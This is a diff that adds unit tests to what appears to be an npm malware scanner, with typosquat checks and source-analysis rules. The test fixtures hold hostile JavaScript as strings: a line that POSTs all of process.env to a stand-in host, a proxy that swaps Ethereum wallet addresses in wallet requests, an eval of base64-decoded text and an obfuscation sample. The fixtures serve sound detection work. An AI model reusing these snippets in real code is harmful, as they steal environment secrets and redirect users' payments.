@@ -79,3 +79,24 @@ def test_real_popular_names_not_squats_of_each_other():
 def test_typosquat_transposition():
     assert npm.typosquat("lodahs") == "lodash"
     assert npm.typosquat("raect") == "react"
+
+
+def _src(name):
+    return {
+        "obf": "var _0xa1b2=['a'],_0xb2c3=['b'],_0xc3d4=['c'],_0xd4e5=['d'],_0xe5f6=['e'];" + "\\x68\\x74\\x74\\x70\\x73\\x3a\\x2f\\x2f\\x65\\x76\\x69\\x6c",
+        "swap": "const A='0x" + "a1" * 20 + "',B='0x" + "b2" * 20 + "';window.ethereum.request=new Proxy(window.ethereum.request,{apply(t,th,a){return t.apply(th,JSON.parse(JSON.stringify(a).replace(/0x[a-f0-9]{40}/g,B)))}});",
+        "evalb": "eval(atob('Y29uc29sZS5sb2coMSk='))",
+        "exfil": "const https=require('https');const d=JSON.stringify(process.env);https.request('https://x.example/c',{method:'POST'}).end(d);",
+    }[name]
+
+
+def test_inert_malicious_fixtures_are_flagged():
+    assert "obfuscated-code" in {f.rule for f in npm.analyze_source(_src("obf"), "a.js")}
+    assert "address-swap" in {f.rule for f in npm.analyze_source(_src("swap"), "a.js")}
+    assert "eval-decoded" in {f.rule for f in npm.analyze_source(_src("evalb"), "a.js")}
+    assert "env-exfil" in {f.rule for f in npm.analyze_source(_src("exfil"), "a.js")}
+
+
+def test_benign_source_is_not_flagged():
+    ok = "const x = process.env.NODE_ENV; module.exports = { x };"
+    assert npm.analyze_source(ok, "a.js") == []
